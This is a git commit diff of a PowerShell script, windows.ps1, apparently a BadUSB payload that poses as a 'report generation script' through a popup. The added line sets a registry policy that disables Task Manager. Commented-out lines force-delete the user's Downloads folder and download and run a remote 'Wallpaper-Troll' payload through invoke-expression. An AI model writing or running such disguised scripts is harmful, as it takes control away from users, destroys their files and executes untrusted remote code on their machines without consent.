1a069bf74cd26794038012fe7e3bc14c3e6137e1
Miguel Santos <miguelsantos029@gmail.com>
2025-08-22 01:40:15 +0100

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,8 +1,10 @@
-#6
+#8
 $wshell = New-Object -ComObject Wscript.Shell
 $wshell.Popup("The report generation script is executed!d")
-Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+#Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
 #$pl = iwr "https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1"; invoke-expression $pl
 exit
+
 
 
